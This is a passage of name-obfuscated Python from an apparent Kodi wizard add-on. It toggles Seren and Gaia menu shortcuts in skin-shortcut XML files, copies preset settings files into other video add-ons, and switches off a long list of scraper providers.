    OOOOO0O0OOO0O0000 =OOOOO0O0OOO0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1374
    with open (OO0O00OOOOOOOOO0O ,'w')as O0000OOOOOOOO0O0O :#line:1377
      O0000OOOOOOOO0O0O .write (OOOOO0O0OOO0O0000 )#line:1378
    OO0O00OOOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1382
    with open (OO0O00OOOOOOOOO0O ,'r')as O0000OOOOOOOO0O0O :#line:1383
      OOOOO0O0OOO0O0000 =O0000OOOOOOOO0O0O .read ()#line:1384
    OOOOO0O0OOO0O0000 =OOOOO0O0OOO0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1402
    with open (OO0O00OOOOOOOOO0O ,'w')as O0000OOOOOOOO0O0O :#line:1405
      O0000OOOOOOOO0O0O .write (OOOOO0O0OOO0O0000 )#line:1406
    OO0O00OOOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1409
    with open (OO0O00OOOOOOOOO0O ,'r')as O0000OOOOOOOO0O0O :#line:1410
      OOOOO0O0OOO0O0000 =O0000OOOOOOOO0O0O .read ()#line:1411
    OOOOO0O0OOO0O0000 =OOOOO0O0OOO0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1429
    with open (OO0O00OOOOOOOOO0O ,'w')as O0000OOOOOOOO0O0O :#line:1432
      O0000OOOOOOOO0O0O .write (OOOOO0O0OOO0O0000 )#line:1433
    OO0O00OOOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1435
    with open (OO0O00OOOOOOOOO0O ,'r')as O0000OOOOOOOO0O0O :#line:1436
      OOOOO0O0OOO0O0000 =O0000OOOOOOOO0O0O .read ()#line:1437
    OOOOO0O0OOO0O0000 =OOOOO0O0OOO0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1455
    with open (OO0O00OOOOOOOOO0O ,'w')as O0000OOOOOOOO0O0O :#line:1458
      O0000OOOOOOOO0O0O .write (OOOOO0O0OOO0O0000 )#line:1459
    OO0O00OOOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1461
    with open (OO0O00OOOOOOOOO0O ,'r')as O0000OOOOOOOO0O0O :#line:1462
      OOOOO0O0OOO0O0000 =O0000OOOOOOOO0O0O .read ()#line:1463
    OOOOO0O0OOO0O0000 =OOOOO0O0OOO0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1481
    with open (OO0O00OOOOOOOOO0O ,'w')as O0000OOOOOOOO0O0O :#line:1484
      O0000OOOOOOOO0O0O .write (OOOOO0O0OOO0O0000 )#line:1485
    OO0O00OOOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1488
    with open (OO0O00OOOOOOOOO0O ,'r')as O0000OOOOOOOO0O0O :#line:1489
      OOOOO0O0OOO0O0000 =O0000OOOOOOOO0O0O .read ()#line:1490
    OOOOO0O0OOO0O0000 =OOOOO0O0OOO0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1508
    with open (OO0O00OOOOOOOOO0O ,'w')as O0000OOOOOOOO0O0O :#line:1511
      O0000OOOOOOOO0O0O .write (OOOOO0O0OOO0O0000 )#line:1512
def rdbuildinstalloff ():#line:1515
    try :#line:1516
       O0000OO00OO00O0O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1517
       OOOO0O0O000O00000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1518
       copyfile (O0000OO00OO00O0O0 ,OOOO0O0O000O00000 )#line:1520
       O0000OO00OO00O0O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1522
       OOOO0O0O000O00000 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1523
       copyfile (O0000OO00OO00O0O0 ,OOOO0O0O000O00000 )#line:1525
       O0000OO00OO00O0O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1527
       OOOO0O0O000O00000 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1528
       copyfile (O0000OO00OO00O0O0 ,OOOO0O0O000O00000 )#line:1530
       O0000OO00OO00O0O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1533
       OOOO0O0O000O00000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1534
       copyfile (O0000OO00OO00O0O0 ,OOOO0O0O000O00000 )#line:1536
    except :#line:1538
       pass #line:1539
def rdbuildaddonON ():#line:1546
    O0OOO0OOO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1548
    with open (O0OOO0OOO000OO0OO ,'r')as OO0O0O00O0OOO0000 :#line:1549
      O00O00O00O0O0OOOO =OO0O0O00O0OOO0000 .read ()#line:1550
    O00O00O00O0O0OOOO =O00O00O00O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1568
    with open (O0OOO0OOO000OO0OO ,'w')as OO0O0O00O0OOO0000 :#line:1571
      OO0O0O00O0OOO0000 .write (O00O00O00O0O0OOOO )#line:1572
    O0OOO0OOO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1576
    with open (O0OOO0OOO000OO0OO ,'r')as OO0O0O00O0OOO0000 :#line:1577
      O00O00O00O0O0OOOO =OO0O0O00O0OOO0000 .read ()#line:1578
    O00O00O00O0O0OOOO =O00O00O00O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1596
    with open (O0OOO0OOO000OO0OO ,'w')as OO0O0O00O0OOO0000 :#line:1599
      OO0O0O00O0OOO0000 .write (O00O00O00O0O0OOOO )#line:1600
    O0OOO0OOO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1604
    with open (O0OOO0OOO000OO0OO ,'r')as OO0O0O00O0OOO0000 :#line:1605
      O00O00O00O0O0OOOO =OO0O0O00O0OOO0000 .read ()#line:1606
    O00O00O00O0O0OOOO =O00O00O00O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1624
    with open (O0OOO0OOO000OO0OO ,'w')as OO0O0O00O0OOO0000 :#line:1627
      OO0O0O00O0OOO0000 .write (O00O00O00O0O0OOOO )#line:1628
    O0OOO0OOO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1632
    with open (O0OOO0OOO000OO0OO ,'r')as OO0O0O00O0OOO0000 :#line:1633
      O00O00O00O0O0OOOO =OO0O0O00O0OOO0000 .read ()#line:1634
    O00O00O00O0O0OOOO =O00O00O00O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1652
    with open (O0OOO0OOO000OO0OO ,'w')as OO0O0O00O0OOO0000 :#line:1655
      OO0O0O00O0OOO0000 .write (O00O00O00O0O0OOOO )#line:1656
    O0OOO0OOO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1659
    with open (O0OOO0OOO000OO0OO ,'r')as OO0O0O00O0OOO0000 :#line:1660
      O00O00O00O0O0OOOO =OO0O0O00O0OOO0000 .read ()#line:1661
    O00O00O00O0O0OOOO =O00O00O00O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1679
    with open (O0OOO0OOO000OO0OO ,'w')as OO0O0O00O0OOO0000 :#line:1682
      OO0O0O00O0OOO0000 .write (O00O00O00O0O0OOOO )#line:1683
    O0OOO0OOO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1685
    with open (O0OOO0OOO000OO0OO ,'r')as OO0O0O00O0OOO0000 :#line:1686
      O00O00O00O0O0OOOO =OO0O0O00O0OOO0000 .read ()#line:1687
    O00O00O00O0O0OOOO =O00O00O00O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1705
    with open (O0OOO0OOO000OO0OO ,'w')as OO0O0O00O0OOO0000 :#line:1708
      OO0O0O00O0OOO0000 .write (O00O00O00O0O0OOOO )#line:1709
    O0OOO0OOO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1711
    with open (O0OOO0OOO000OO0OO ,'r')as OO0O0O00O0OOO0000 :#line:1712
      O00O00O00O0O0OOOO =OO0O0O00O0OOO0000 .read ()#line:1713
    O00O00O00O0O0OOOO =O00O00O00O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1731
    with open (O0OOO0OOO000OO0OO ,'w')as OO0O0O00O0OOO0000 :#line:1734
      OO0O0O00O0OOO0000 .write (O00O00O00O0O0OOOO )#line:1735
    O0OOO0OOO000OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1738
    with open (O0OOO0OOO000OO0OO ,'r')as OO0O0O00O0OOO0000 :#line:1739
      O00O00O00O0O0OOOO =OO0O0O00O0OOO0000 .read ()#line:1740
    O00O00O00O0O0OOOO =O00O00O00O0O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1758
    with open (O0OOO0OOO000OO0OO ,'w')as OO0O0O00O0OOO0000 :#line:1761
      OO0O0O00O0OOO0000 .write (O00O00O00O0O0OOOO )#line:1762
def rdbuildinstallON ():#line:1765
    try :#line:1767
       OO0O0OO0O0O00O0O0 =ADDONPATH +"/resources/rd/victory.xml"#line:1768
       OO00O0000OO0OOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1769
       copyfile (OO0O0OO0O0O00O0O0 ,OO00O0000OO0OOOOO )#line:1771
       OO0O0OO0O0O00O0O0 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1773
       OO00O0000OO0OOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1774
       copyfile (OO0O0OO0O0O00O0O0 ,OO00O0000OO0OOOOO )#line:1776
       OO0O0OO0O0O00O0O0 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1778
       OO00O0000OO0OOOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1779
       copyfile (OO0O0OO0O0O00O0O0 ,OO00O0000OO0OOOOO )#line:1781
       OO0O0OO0O0O00O0O0 =ADDONPATH +"/resources/rd/Splash.png"#line:1784
       OO00O0000OO0OOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1785
       copyfile (OO0O0OO0O0O00O0O0 ,OO00O0000OO0OOOOO )#line:1787
    except :#line:1789
       pass #line:1790
def rdbuild ():#line:1800
	O00000OOO0O000OO0 =(ADDON .getSetting ("auto_rd"))#line:1801
	if O00000OOO0O000OO0 =='true':#line:1802
		OO0O00OOO000O00O0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1803
		OO0O00OOO000O00O0 .setSetting ('all_t','0')#line:1804
		OO0O00OOO000O00O0 .setSetting ('rd_menu_enable','false')#line:1805
		OO0O00OOO000O00O0 .setSetting ('magnet_bay','false')#line:1806
		OO0O00OOO000O00O0 .setSetting ('magnet_extra','false')#line:1807
		OO0O00OOO000O00O0 .setSetting ('rd_only','false')#line:1808
		OO0O00OOO000O00O0 .setSetting ('ftp','false')#line:1810
		OO0O00OOO000O00O0 .setSetting ('fp','false')#line:1811
		OO0O00OOO000O00O0 .setSetting ('filter_fp','false')#line:1812
		OO0O00OOO000O00O0 .setSetting ('fp_size_en','false')#line:1813
		OO0O00OOO000O00O0 .setSetting ('afdah','false')#line:1814
		OO0O00OOO000O00O0 .setSetting ('ap2s','false')#line:1815
		OO0O00OOO000O00O0 .setSetting ('cin','false')#line:1816
		OO0O00OOO000O00O0 .setSetting ('clv','false')#line:1817
		OO0O00OOO000O00O0 .setSetting ('cmv','false')#line:1818
		OO0O00OOO000O00O0 .setSetting ('dl20','false')#line:1819
		OO0O00OOO000O00O0 .setSetting ('esc','false')#line:1820
		OO0O00OOO000O00O0 .setSetting ('extra','false')#line:1821
		OO0O00OOO000O00O0 .setSetting ('film','false')#line:1822
		OO0O00OOO000O00O0 .setSetting ('fre','false')#line:1823
		OO0O00OOO000O00O0 .setSetting ('fxy','false')#line:1824
		OO0O00OOO000O00O0 .setSetting ('genv','false')#line:1825
		OO0O00OOO000O00O0 .setSetting ('getgo','false')#line:1826
		OO0O00OOO000O00O0 .setSetting ('gold','false')#line:1827
		OO0O00OOO000O00O0 .setSetting ('gona','false')#line:1828
		OO0O00OOO000O00O0 .setSetting ('hdmm','false')#line:1829
		OO0O00OOO000O00O0 .setSetting ('hdt','false')#line:1830
		OO0O00OOO000O00O0 .setSetting ('icy','false')#line:1831
		OO0O00OOO000O00O0 .setSetting ('ind','false')#line:1832
		OO0O00OOO000O00O0 .setSetting ('iwi','false')#line:1833
		OO0O00OOO000O00O0 .setSetting ('jen_free','false')#line:1834
		OO0O00OOO000O00O0 .setSetting ('kiss','false')#line:1835
		OO0O00OOO000O00O0 .setSetting ('lavin','false')#line:1836
		OO0O00OOO000O00O0 .setSetting ('los','false')#line:1837
		OO0O00OOO000O00O0 .setSetting ('m4u','false')#line:1838
		OO0O00OOO000O00O0 .setSetting ('mesh','false')#line:1839
		OO0O00OOO000O00O0 .setSetting ('mf','false')#line:1840
		OO0O00OOO000O00O0 .setSetting ('mkvc','false')#line:1841
		OO0O00OOO000O00O0 .setSetting ('mjy','false')#line:1842
		OO0O00OOO000O00O0 .setSetting ('hdonline','false')#line:1843
		OO0O00OOO000O00O0 .setSetting ('moviex','false')#line:1844
		OO0O00OOO000O00O0 .setSetting ('mpr','false')#line:1845
		OO0O00OOO000O00O0 .setSetting ('mvg','false')#line:1846
		OO0O00OOO000O00O0 .setSetting ('mvl','false')#line:1847
		OO0O00OOO000O00O0 .setSetting ('mvs','false')#line:1848
		OO0O00OOO000O00O0 .setSetting ('myeg','false')#line:1849
		OO0O00OOO000O00O0 .setSetting ('ninja','false')#line:1850
		OO0O00OOO000O00O0 .setSetting ('odb','false')#line:1851
		OO0O00OOO000O00O0 .setSetting ('ophd','false')#line:1852
		OO0O00OOO000O00O0 .setSetting ('pks','false')#line:1853
		OO0O00OOO000O00O0 .setSetting ('prf','false')#line:1854
		OO0O00OOO000O00O0 .setSetting ('put18','false')#line:1855
		OO0O00OOO000O00O0 .setSetting ('req','false')#line:1856
		OO0O00OOO000O00O0 .setSetting ('rftv','false')#line:1857
		OO0O00OOO000O00O0 .setSetting ('rltv','false')#line:1858
		OO0O00OOO000O00O0 .setSetting ('sc','false')#line:1859
		OO0O00OOO000O00O0 .setSetting ('seehd','false')#line:1860
		OO0O00OOO000O00O0 .setSetting ('showbox','false')#line:1861
		OO0O00OOO000O00O0 .setSetting ('shuid','false')#line:1862
		OO0O00OOO000O00O0 .setSetting ('sil_gh','false')#line:1863
		OO0O00OOO000O00O0 .setSetting ('spv','false')#line:1864
		OO0O00OOO000O00O0 .setSetting ('subs','false')#line:1865
		OO0O00OOO000O00O0 .setSetting ('tvs','false')#line:1866
		OO0O00OOO000O00O0 .setSetting ('tw','false')#line:1867
		OO0O00OOO000O00O0 .setSetting ('upto','false')#line:1868
		OO0O00OOO000O00O0 .setSetting ('vel','false')#line:1869
		OO0O00OOO000O00O0 .setSetting ('vex','false')#line:1870
		OO0O00OOO000O00O0 .setSetting ('vidc','false')#line:1871
		OO0O00OOO000O00O0 .setSetting ('w4hd','false')#line:1872
		OO0O00OOO000O00O0 .setSetting ('wav','false')#line:1873
		OO0O00OOO000O00O0 .setSetting ('wf','false')#line:1874
		OO0O00OOO000O00O0 .setSetting ('wse','false')#line:1875
		OO0O00OOO000O00O0 .setSetting ('wss','false')#line:1876
		OO0O00OOO000O00O0 .setSetting ('wsse','false')#line:1877
		OO0O00OOO000O00O0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1878
		OO0O00OOO000O00O0 .setSetting ('debrid.only','true')#line:1879
		OO0O00OOO000O00O0 .setSetting ('hosts.captcha','false')#line:1880
		OO0O00OOO000O00O0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1881
		OO0O00OOO000O00O0 .setSetting ('provider.123moviehd','false')#line:1882
		OO0O00OOO000O00O0 .setSetting ('provider.300mbdownload','false')#line:1883
		OO0O00OOO000O00O0 .setSetting ('provider.alltube','false')#line:1884
		OO0O00OOO000O00O0 .setSetting ('provider.allucde','false')#line:1885
		OO0O00OOO000O00O0 .setSetting ('provider.animebase','false')#line:1886
		OO0O00OOO000O00O0 .setSetting ('provider.animeloads','false')#line:1887
		OO0O00OOO000O00O0 .setSetting ('provider.animetoon','false')#line:1888
		OO0O00OOO000O00O0 .setSetting ('provider.bnwmovies','false')#line:1889
		OO0O00OOO000O00O0 .setSetting ('provider.boxfilm','false')#line:1890
		OO0O00OOO000O00O0 .setSetting ('provider.bs','false')#line:1891
		OO0O00OOO000O00O0 .setSetting ('provider.cartoonhd','false')#line:1892
		OO0O00OOO000O00O0 .setSetting ('provider.cdahd','false')#line:1893
		OO0O00OOO000O00O0 .setSetting ('provider.cdax','false')#line:1894
		OO0O00OOO000O00O0 .setSetting ('provider.cine','false')#line:1895
		OO0O00OOO000O00O0 .setSetting ('provider.cinenator','false')#line:1896
		OO0O00OOO000O00O0 .setSetting ('provider.cmovieshdbz','false')#line:1897
		OO0O00OOO000O00O0 .setSetting ('provider.coolmoviezone','false')#line:1898
		OO0O00OOO000O00O0 .setSetting ('provider.ddl','false')#line:1899
		OO0O00OOO000O00O0 .setSetting ('provider.deepmovie','false')#line:1900
		OO0O00OOO000O00O0 .setSetting ('provider.ekinomaniak','false')#line:1901
		OO0O00OOO000O00O0 .setSetting ('provider.ekinotv','false')#line:1902
		OO0O00OOO000O00O0 .setSetting ('provider.filiser','false')#line:1903
		OO0O00OOO000O00O0 .setSetting ('provider.filmpalast','false')#line:1904
		OO0O00OOO000O00O0 .setSetting ('provider.filmwebbooster','false')#line:1905
		OO0O00OOO000O00O0 .setSetting ('provider.filmxy','false')#line:1906
		OO0O00OOO000O00O0 .setSetting ('provider.fmovies','false')#line:1907
		OO0O00OOO000O00O0 .setSetting ('provider.foxx','false')#line:1908
		OO0O00OOO000O00O0 .setSetting ('provider.freefmovies','false')#line:1909
		OO0O00OOO000O00O0 .setSetting ('provider.freeputlocker','false')#line:1910
		OO0O00OOO000O00O0 .setSetting ('provider.furk','false')#line:1911
		OO0O00OOO000O00O0 .setSetting ('provider.gamatotv','false')#line:1912
		OO0O00OOO000O00O0 .setSetting ('provider.gogoanime','false')#line:1913
		OO0O00OOO000O00O0 .setSetting ('provider.gowatchseries','false')#line:1914
		OO0O00OOO000O00O0 .setSetting ('provider.hackimdb','false')#line:1915
		OO0O00OOO000O00O0 .setSetting ('provider.hdfilme','false')#line:1916
		OO0O00OOO000O00O0 .setSetting ('provider.hdmto','false')#line:1917
		OO0O00OOO000O00O0 .setSetting ('provider.hdpopcorns','false')#line:1918
		OO0O00OOO000O00O0 .setSetting ('provider.hdstreams','false')#line:1919
		OO0O00OOO000O00O0 .setSetting ('provider.horrorkino','false')#line:1921
		OO0O00OOO000O00O0 .setSetting ('provider.iitv','false')#line:1922
		OO0O00OOO000O00O0 .setSetting ('provider.iload','false')#line:1923
		OO0O00OOO000O00O0 .setSetting ('provider.iwaatch','false')#line:1924
		OO0O00OOO000O00O0 .setSetting ('provider.kinodogs','false')#line:1925
		OO0O00OOO000O00O0 .setSetting ('provider.kinoking','false')#line:1926
		OO0O00OOO000O00O0 .setSetting ('provider.kinow','false')#line:1927
		OO0O00OOO000O00O0 .setSetting ('provider.kinox','false')#line:1928
		OO0O00OOO000O00O0 .setSetting ('provider.lichtspielhaus','false')#line:1929
		OO0O00OOO000O00O0 .setSetting ('provider.liomenoi','false')#line:1930
		OO0O00OOO000O00O0 .setSetting ('provider.magnetdl','false')#line:1933
		OO0O00OOO000O00O0 .setSetting ('provider.megapelistv','false')#line:1934
		OO0O00OOO000O00O0 .setSetting ('provider.movie2k-ac','false')#line:1935
		OO0O00OOO000O00O0 .setSetting ('provider.movie2k-ag','false')#line:1936
		OO0O00OOO000O00O0 .setSetting ('provider.movie2z','false')#line:1937
